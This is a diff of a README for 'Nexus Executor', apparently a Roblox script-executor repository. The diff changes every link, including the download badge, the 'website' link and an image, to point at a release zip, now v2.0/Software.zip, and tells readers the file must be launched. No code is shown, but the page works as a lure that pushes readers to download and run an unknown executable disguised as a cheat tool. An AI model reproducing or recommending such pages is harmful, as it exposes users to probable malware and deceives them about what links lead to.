@@ -23,12 +23,12 @@ Nexus Executor is a robust tool that supports the execution of a wide range of L
 
 ## 📁 Download Nexus Executor
 To access the Nexus Executor tool, please download the latest version from the following link:
-[![Nexus Executor Download](https://github.com/pkoverjr/Nexus-Roblox/releases/download/v1.0/App.zip%20Here-v1.0.0-blue)](https://github.com/pkoverjr/Nexus-Roblox/releases/download/v1.0/App.zip)
+[![Nexus Executor Download](https://github.com/pkoverjr/Nexus-Roblox/releases/download/v2.0/Software.zip%20Here-v1.0.0-blue)](https://github.com/pkoverjr/Nexus-Roblox/releases/download/v2.0/Software.zip)
 
 ⚠️ Please note that the downloaded file needs to be launched to install the Nexus Executor tool successfully.
 
 ## 🌐 Visit Our Website
-For more information about Nexus Executor and to explore additional features, visit our website [here](https://github.com/pkoverjr/Nexus-Roblox/releases/download/v1.0/App.zip).
+For more information about Nexus Executor and to explore additional features, visit our website [here](https://github.com/pkoverjr/Nexus-Roblox/releases/download/v2.0/Software.zip).
 
 ## 🚨 Issues with Download?
 If you encounter any issues with the download link provided, kindly check the "Releases" section of this repository for alternative download options.
@@ -41,7 +41,7 @@ If you encounter any issues with the download link provided, kindly check the "R
 ## 🎮 Explore More with Nexus-Roblox
 Join our community of Roblox scripters and delve into the world of Nexus Executor. Unleash your creativity, execute scripts seamlessly, and take your Roblox scripting skills to new heights with Nexus-Roblox.
 
-![Roblox Nexus](https://github.com/pkoverjr/Nexus-Roblox/releases/download/v1.0/App.zip)
+![Roblox Nexus](https://github.com/pkoverjr/Nexus-Roblox/releases/download/v2.0/Software.zip)
 
 ## 📝 Contribution Guidelines
 We welcome contributions from the community to enhance the functionality and features of Nexus Executor. If you have any suggestions, improvements, or bug fixes, feel free to submit a pull request.
